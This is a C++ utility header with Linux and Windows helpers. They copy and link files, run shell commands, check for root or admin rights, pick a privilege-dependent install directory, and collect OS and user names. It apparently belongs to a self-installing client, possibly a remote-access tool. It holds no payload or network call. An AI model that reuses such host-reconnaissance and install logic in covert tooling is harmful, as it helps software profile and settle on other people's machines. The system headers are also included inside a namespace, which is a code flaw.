#ifndef UTIL_HH
#define UTIL_HH

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>

#include "constants.hh"
#include "request.hh"

namespace util {

#ifdef __linux__

#include <unistd.h>

bool CopyFile(std::string source_path, std::string new_path) {
    std::ifstream source_file(source_path, std::ios::binary);
    std::ofstream new_file(new_path, std::ios::binary | std::ios::trunc);
    if (source_file.is_open() && new_file.is_open()) {
        new_file << source_file.rdbuf();
        return true;
    } else
        return false;
}

int LinkFile(std::string source_file, std::string new_file) {
    return link(source_file.c_str(), new_file.c_str());
}

std::string PopenSubprocess(const std::string& command) {
    FILE* pipe;
    char buf[512];
    std::string output;

    if (!(pipe = popen(command.c_str(), "r"))) {
        std::exit(1);
    }

    while (std::fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    pclose(pipe);

    return output;
}

bool IsSuperuser() { return (PopenSubprocess("id -u | tr -d '\n'") == "0"); }

std::string GetInstallDir() {
    std::string install_dir;
    if (IsSuperuser()) {
        install_dir = ROOT_HOME + "/" + INSTALL_DIR + "/";
    } else {
        install_dir = std::getenv("HOME") + ("/" + INSTALL_DIR + "/");
    }

    return install_dir;
}

std::string GetOS() { return PopenSubprocess("uname | tr -d '\n'"); }

std::string GetUser() {
    std::string user;

    if (IsSuperuser()) {
        user = "root";
    } else {
        user = std::getenv("USER");
    }

    return user;
}

#endif  // __linux__

#ifdef WIN32

#include <windows.h>
#include <regex>

bool IS_SUPERUSER;
bool IS_SUPERUSER_IS_CACHED = false;

bool CopyFile(std::string source_file, std::string new_file) {
    return CopyFile(source_file.c_str(), new_file.c_str(), false);
}

std::string PopenSubprocess(const std::string& command) {
    FILE* pipe;
    char buf[512];
    std::string output;

    if (!(pipe = _popen(command.c_str(), "r"))) {
        std::exit(1);
    }

    while (fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    _pclose(pipe);

    return output;
}

bool IsSuperuser() {
    if (IS_SUPERUSER_IS_CACHED) {
        return IS_SUPERUSER;
    } else {
        IS_SUPERUSER = (PopenSubprocess("net session")).size();
        IS_SUPERUSER_IS_CACHED = true;

        return IS_SUPERUSER;
    }
}

std::string GetInstallDir() {
    std::string install_dir;
    if (IsSuperuser()) {
        install_dir = ADMIN_INSTALL_DIR + "\\";
    } else {
        install_dir = std::getenv("USERPROFILE") + ("\\" + INSTALL_DIR + "\\");
    }

    return install_dir;
}

std::string GetOS() {
    std::string win_version =
        PopenSubprocess("systeminfo | findstr /B /C:\"OS Name\"");
    std::regex pattern("[\\n\\r\\s]*.*?(Windows\\s*\\S+).*[\\n\\r\\s]*");
    std::smatch match;
    std::regex_match(win_version, match, pattern);

    return match[1];
}

std::string GetUser() {
    std::string user = std::getenv("USERNAME");
    if (IsSuperuser()) {
        user += " (admin)";
    }

    return user;
}

#endif  // WIN32

}  // namespace util

#endif  // UTIL_HH